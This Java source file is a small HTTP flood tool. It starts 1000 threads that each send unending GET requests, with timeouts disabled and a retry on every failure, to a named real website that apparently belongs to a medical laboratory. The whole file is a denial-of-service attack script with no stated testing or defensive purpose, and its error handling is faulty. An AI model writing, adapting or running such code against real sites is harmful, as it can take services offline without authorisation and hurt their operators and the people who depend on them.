import com.mashape.unirest.http.HttpResponse;
import com.mashape.unirest.http.Unirest;

public class HeyBabe implements Runnable {

    public static void main(String[] args) {
        extracted();
    }

    private static void extracted() {
        for (int i = 0; i < 1000; i++) {
            final HeyBabe heyBabe = new HeyBabe();
            final Thread thread = new Thread(heyBabe);

            thread.start();
        }
    }

    public static void hey() {
        double v = Math.random() * 49 + 1;
        Unirest.setTimeouts(0, 0);
        HttpResponse<String> response = null;
        try {
            response = Unirest.get("https://medlabspb.ru")
                    .asString();
            System.out.println("Status code " + response.getStatus());
        } catch (Exception e) {
            hey();
            System.out.println("Status code " + response.getStatus());
        }
    }

    public static void loop() {
        try {
            while (true) {
                hey();
            }
        } catch (Exception e) {
            while (true) {
                hey();
            }
        }
    }

    @Override
    public void run() {
        try {
            loop();
        } catch (Exception e) {
            loop();
        }
    }
}
